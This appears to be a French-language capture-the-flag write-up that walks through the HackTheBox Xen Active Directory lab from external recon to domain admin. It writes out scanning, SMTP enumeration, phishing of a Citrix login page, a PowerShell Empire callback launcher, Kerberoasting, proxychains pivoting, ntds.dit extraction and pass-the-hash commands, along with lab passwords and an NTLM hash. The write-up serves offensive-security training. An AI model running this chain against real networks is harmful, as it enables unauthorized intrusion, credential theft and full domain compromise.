Fin de partie HackTheBox. Procédure pas à pas Xen Lab. Pentest Active Directory



Dans cet article, nous analyserons le passage non seulement d'une voiture, mais de tout un mini-laboratoire du site HackTheBox .

Comme indiqué dans la description, Xen est conçu pour tester les compétences à toutes les étapes des attaques dans un petit environnement Active Directory. L'objectif est de compromettre un hôte accessible, d'augmenter les privilèges et, finalement, de compromettre l'ensemble du domaine, tout en collectant 6 drapeaux.

Voir une discussion d'un autre laboratoire d'opérations offensives professionnelles ici .

La connexion au laboratoire se fait via VPN. Il est recommandé de ne pas se connecter à partir d'un ordinateur professionnel ou d'un hôte où les données importantes pour vous sont disponibles, car vous entrez dans un réseau privé avec des personnes qui connaissent quelque chose dans le domaine de la sécurité de l'information :)

Drapeau de violation


Cette machine a une adresse IP de 10.13.38.12, que j'ajoute à / etc / hosts.
10.13.38.12 xen.htb

Tout d'abord, nous analysons les ports ouverts. Puisqu'il faut beaucoup de temps pour analyser tous les ports avec nmap, je vais d'abord le faire avec masscan. Nous analysons tous les ports TCP et UDP à partir de l'interface tun0 à une vitesse de 500 paquets par seconde.

sudo masscan -e tun0 -p1-65535,U:1-65535 10.13.38.12 --rate=500



Maintenant, pour des informations plus détaillées sur les services qui fonctionnent sur les ports, nous allons exécuter une analyse avec l'option -A.

nmap -A xen.htb -p25,80,443



Ainsi, nous avons IIS et SMTP. Dans le même temps, il existe la possibilité de connexions HTTP et HTTPS sur les ports 80 et 443. Voyons le Web - nous sommes accueillis par un simple site.



Il n'y a rien d'intéressant, à part le lien «Rejoignez l'équipe», nous indiquant l'adresse email jointheteam@humongousretail.com.



Passons en revue les répertoires. J'utilise gobuster pour cela. Dans les paramètres, nous indiquons le nombre de flux 128 (-t), URL (-u), dictionnaire (-w) et extensions qui nous intéressent (-x).

gobuster dir -t 128 -u http://xen.htb/  -w /usr/share/seclists/Discovery/Web-Content/raft-large-words.txt -x php,html,aspx



Et nous trouvons des répertoires intéressants. Le code 401 indique la présence de l'authentification HTTP, regardons à distance.



Nous acceptons et demandons des informations d'identification.



Nous avons besoin d'informations d'identification. Avec cela, j'ai décidé de retourner sur le serveur SMTP et de trier les noms d'utilisateurs (je recommande d'utiliser celui que Metasploit propose comme liste de noms). Nous le faisons en utilisant smtp-user-enum.

smtp-user-enum -M RCPT -U ./namelist.txt -D humongousretail.com -t xen.htb



Nous trouvons 4 adresses e-mail. Puisque nous voyons le courrier du service informatique, nous pouvons envoyer un message à tous les autres utilisateurs en leur nom. Copions la page d'autorisation à distance, faisons-en une fausse et envoyons à tous les utilisateurs la fausse adresse du portail distant (en fait, j'ai été très surpris quand il s'est avéré que c'était le bon vecteur).

Vous pouvez faire une copie complète de la page en utilisant l'extension SingleFile pour Firefox. Ensuite, jetez un œil au code source et modifiez les données du formulaire. La première consiste à changer l'adresse à laquelle les informations d'identification seront envoyées, j'ai défini mon hôte et le port 81.



Et ajoutez Soumettre pour envoyer les données.



Exécutez maintenant netcat pour écouter sur le port 81, activez le serveur Web et faites référence au fichier modifié sous le nom index.html.





Ça marche! Envoyons un message sur la modification de l'adresse du portail.



Mais le vecteur est correct, mais l'exécution n'est pas très) Nous obtenons donc les données, mais sous forme robotique sur le port 80.



Ainsi, nous collectons tous les comptes.



Et maintenant, nous allons à distance.



Et nous proposons d'enregistrer le fichier ICA.



Ensuite, j'ai installé l'extension pour Chromium.



Et connecté en tant que pmorgan (VDESKTOP3).





Nous faisons de même avec les autres utilisateurs. Et récompensez trouver le premier drapeau.



Et louez-le.

Drapeau fantôme


Pour une exploration plus approfondie, il est pratique d'utiliser PowerShell, et encore plus pratique de travailler via PowerShell Empire (à propos duquel j'ai écrit ici ). Ouvrons la session, pour cela créez d'abord un lanceur http et PS pour cela.

> listeners
> uselistener http
> set Host 10.14.14.9
> set Port 5656
> execute
> back
> launcher powershell http



Enregistrez le lanceur dans le fichier s.ps1. Pour l'exécuter à partir de la mémoire via meterpreter, vous devez charger le module PowerShell.



Et exécutez powershell_import.



Dans la fenêtre Empire, nous trouvons l'agent créé.



Pour un travail pratique, renommez-le par le nom du poste de travail et passez en mode interactif.





Pour l'intelligence, nous devons définir un contrôleur de domaine. Nous le ferons à l'aide d'un merveilleux module get_domain_controller de la section situational_awareness.

> usemodule situational_awareness/network/powerview/get_domain_controller
> run



Nous obtenons donc des informations sur le contrôleur de domaine. Maintenant, listons les utilisateurs du domaine. À ce stade, je dois obtenir les noms de compte et la valeur de la propriété AdminCount pour identifier immédiatement les utilisateurs privilégiés.

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties samaccountname,admincount
> run



Vérifions immédiatement les SPN pour déterminer si le Kerberoasting est possible.

> usemodule situational_awareness/network/powerview/get_user
> set Server DC.htb.local
> set Properties serviceprincipalname
> run



Et il y a SPN! Faisons Kerberoasting en utilisant le même Empire. Spécifiez le format de sortie - hashcat.

> usemodule credentials/invoke_kerberoast
> set OutputFormat Hashcat
> run



Et nous obtenons le hachage utilisateur. Maintenant, parcourez le hashcat.

hashcat -m 13100 -a 0 krb.hash rockyou.txt --force

Ce mot de passe est introuvable dans le dictionnaire rockyou, j'ai donc vérifié tous les dictionnaires de Seclists. Mais cette option a également échoué. La dernière option consiste à utiliser les règles NSA .



Comme présenté dans le référentiel, la plongée est la meilleure option, nous utilisons donc sa deuxième version.

hashcat -m 13100 krb.hash rockyou.txt -r nsa-rules/_NSAKEY.v2.dive.rule -debug-mode=1 -debug-file=rule.txt -d 2



Et nous obtenons le mot de passe de cet utilisateur. Pour de nouvelles avancées, analysons le réseau local. Pour ce faire, il est préférable d'utiliser l'analyse ARP, car ICMP peut être bloqué. Le module arpscan nous y aidera: nous connaissons l'adresse et le masque du réseau, nous allons donc définir la gamme d'hôtes.

> usemodule situational_awareness/network/arpscan
> set Range 172.16.249.0-172.16.249.255
> run



Donc ... De cette liste, nous ne connaissons pas deux hôtes: 201 et 202. Vérifions les ressources partagées dans le domaine. À partir des paramètres, nous n'avons besoin que de l'adresse du contrôleur de domaine.

> usemodule situational_awareness/network/powerview/share_finder
> set Server DC.htb.local
> run



À chaque analyse, notre compréhension du réseau s'élargit, découvrons le type d'hôte CITRIX.htb.local.



Voici les informations que nous accumulons.



Pour interagir avec les ressources du réseau interne, nous devons configurer le tunnel. Nous le ferons dans la session meterpreter active en utilisant la commande autoroute, et spécifierons l'adresse réseau interne et le masque en tant que paramètre (avec le paramètre -p nous pouvons vérifier les routes actives).

run autoroute -s 172.16.249.0/24



Maintenant que nous avons ajouté l'itinéraire vers le réseau cible, nous allons utiliser l'outil socks4a depuis l'intérieur de la plateforme. Le module auxiliaire auxiliaire / serveur / socks4a fournit un serveur proxy qui utilise l'infrastructure de routage Metasploit que nous avons créée pour relayer les connexions.



Et en tant que client-redirecteur, nous utilisons des chaînes proxy. Modifiez sa configuration /etc/proxychains.conf, en spécifiant le port défini par metasploit (le port par défaut est 1080).



Et pour l'utilisateur trouvé, le répertoire Citrix $ est lisible. Étant donné que les chaînes proxy affichent les informations de connexion, nous les supprimons à l'aide de la redirection 2> / dev / null.

proxychains cme smb -u mturner -p '4install!' -d htb.local 172.16.249.201 --share "Citrix$" --shares 2>/dev/null



Voyons tout ce qui est à notre disposition sur cette ressource.

proxychains smbmap -u mturner -p '4install!' -d htb.local -H 172.16.249.201 -R 2>/dev/null



Et nous retrouvons le drapeau ainsi que le fichier ppk. Obtenons tous les fichiers.

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install!



Lors de la connexion, nous obtenons une erreur qui peut être éliminée en spécifiant l'option de protocole client min.

sudo proxychains smbclient //172.16.249.201/Citrix$ -U htb.local\\mturner%4install! --option='client min protocol=NT1' 2>/dev/null



Et remets le drapeau.





Drapeau camouflage


Voyons la clé privée Putty.



Cette clé privée est cryptée et conçue pour l'autorisation SSH. Passons en revue le mot de passe utilisé pour déchiffrer la clé. Pour ce faire, reformatez d'abord la clé au format john.



Mais le tri dans les dictionnaires standard n'a pas fonctionné, et ils m'ont incité à un excellent outil pour générer des mots de passe «facilement saisis» - kwprocessor . Créons un dictionnaire.

./kwp -o key-dict.txt basechars/tiny.base keymaps/en.keymap routes/2-to-32-max-5-direction-changes.route



Et nous avons réussi à trouver le mot de passe à 16 caractères.

john --wordlist=./kwprocessor/key-dict.txt putty.john



Étant donné que j'ai Linux, il est plus pratique pour moi de travailler avec un client SSH standard. Reformatez la clé de ce format.

sudo apt install putty-tools
puttygen private.ppk -O private-openssh -o id_rsa

Maintenant, nous décidons où nous pouvons aller avec lui. Pour ce faire, scanné le réseau interne pour trouver le port ouvert 22.

proxychains nmap -p22 172.16.249.200-205 2>/dev/null



Et nous trouvons, mais nous ne savons toujours rien de cet hôte. En essayant de se connecter sans nom, nous recevons un message intéressant et une demande de mot de passe.



L'examen des noms des utilisateurs que nous connaissons n'a pas donné de résultats. La numérisation de nmap de ce service à l'aide de scripts n'a également donné aucun résultat.



Ensuite, j'ai analysé tous les ports de l'hôte. Mais il n'a pas attendu la fin de l'analyse, car cela a pris très longtemps, car dans les informations des chaînes proxy, on pouvait observer si le port était disponible ou non.



Le port 80 étant disponible, j'ai installé un proxy dans mon navigateur et je suis allé voir ce qu'il y avait.



Nous sommes accueillis par la page d'autorisation de Citrix NetScaler. Et Google nous amène à la documentation, dans laquelle nous reconnaissons la connexion par défaut.





Et avec cette connexion, nous nous connectons avec succès via SSH.



Après avoir erré sur le serveur, j'ai regardé des documents sur les attaques contre ce type d'équipement, dont la surveillance du trafic. Ainsi, j'ai laissé tcpdump actif pendant un certain temps et j'ai reçu un vidage de trafic.

tcpdump -s0 -w r.pcap



Téléchargez maintenant ce fichier.

proxychains scp -i id_rsa nsroot@172.16.249.202:/root/r.pcap ./

Et pour trouver rapidement des informations d'identification, nous utilisons PCredz .



Et nous obtenons un autre drapeau.



Drapeau Doppelganger


Mais ce programme ne regarde pas du tout, vous devez donc analyser le vidage pour la présence de divers secrets ou jetons. Après avoir trié les paquets par protocole, nous arrivons à LDAP et trouvons la bindRequest de deux utilisateurs qui ont un mot de passe (nous en avons déjà trouvé un).





Vérifiez ce mot de passe pour cet utilisateur.

proxychains cme smb -u "netscaler-svc" -p "#S3rvice#@cc" -d htb.local 172.16.249.200 2>/dev/null



Cet utilisateur n'est pas remarquable, sauf qu'il est un utilisateur du service. Souvent, les mots de passe de ces utilisateurs coïncident avec les mots de passe des autres utilisateurs du domaine. Vérifions quels autres utilisateurs utiliseront ce mot de passe. Je l'ai fait en utilisant metasploit.

proxychains msfconsole 2>/dev/null
> use auxiliary/scanner/smb/smb_login
> set SMBDomain htb.local
> set RHOSTS 172.16.249.200
> set USER_FILE ~/tmp/users.txt
> set PASS_FILE ~/tmp/passwords.txt
> set VERBOSE false
> run



Et ce mot de passe est allé à tous les comptes de service. Comme nous l'avons découvert précédemment, le compte backup-svc est privilégié, ce qui signifie qu'il est autorisé à se connecter au contrôleur de domaine. Vérifiez les ports ouverts des services RDP (3389) et WinRM (5985).

proxychains nmap -p 3389,5985 172.16.249.200 2>/dev/null



Les deux méthodes de connexion sont possibles, mais je préfère WinRM. Connectez-vous à l'aide du programme Evil-WinRM.

proxychains evil-winrm -i 172.16.249.200 -u backup-svc -p "#S3rvice#@cc" 2>/dev/null



Et prenez un autre drapeau.



Drapeau appartenant


Après avoir regardé les informations sur cet utilisateur, nous voyons son appartenance à des groupes privilégiés, afin que nous puissions copier le fichier ntds.dit et extraire les informations d'identification des utilisateurs du domaine.

whoami /all



Parmi les méthodes de vidage du fichier ntds, l'option discshadow est correctement exécutée. Connectons-nous en utilisant RDP. En tant que client, j'utilise remmina.

proxychains remmina





Et nous sommes accueillis par une fenêtre d'invite de commande.



Entrons dans le contexte de l'ombre à disques.



Et créez une copie - lecteur Z.

set context persistence nowriters
add volume c: alias sss
create 
expose %sss% z:



Vérifiez et voyez une copie du fichier ntds.dit.



Nous avons également besoin d'un fichier système pour décrypter la base de données ntds, mais il est plus facile de l'obtenir.

reg.exe save hklm\system C:\Users\backup-svc\Documents\system.bak



Mais ce n'est pas tout, car le fichier ntds ne peut pas être copié comme ça. Pour ce faire, utilisez l' outil suivant . Tout d'abord, chargez les deux DLL sur l'hôte.



Et chargez en mémoire.



Maintenant, nous activons le privilège et vérifions qu'il est à l'état Activé.

Set-SeBackupPrivilege
Whoami /priv | findstr Backup



Ok, copiez maintenant le fichier.

Copy-FileSeBackupPrivilege z:\windows\ntds\ntds.dit C:\Users\backup-svc\Documents\ntds.dit

Et maintenant, nous téléchargeons les ntds et les fichiers système sur l'hôte local ( et à ce moment le laboratoire se ferme et je perds l'accès, juste pendant le téléchargement des fichiers ... Il s'est avéré que le laboratoire est devenu disponible uniquement pour les utilisateurs avec un abonnement (est allé pour une nouvelle résolution) et je ne peux pas terminer le passage ! Mais merci beaucoup à @kemstat d'avoir partagé la configuration VPN pour la durée du VIP, afin que je puisse terminer ce passage ). Obtenons les informations d'identification.

secretsdump.py -ntds ndts.dit -system system.bak LOCAL



Et il y a un hachage administrateur. Utilisez maintenant l'attaque PTH pour vous connecter au serveur. Mais psexec (connexion via SMB) nous empêche de lire le fichier.





Mais WMI nous donne un accès illimité et nous obtenons les privilèges de l'administrateur de domaine et le dernier drapeau.

proxychains wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:822601ccd7155f47cd955b94af1558be Administrator@172.16.249.200 2>/dev/null
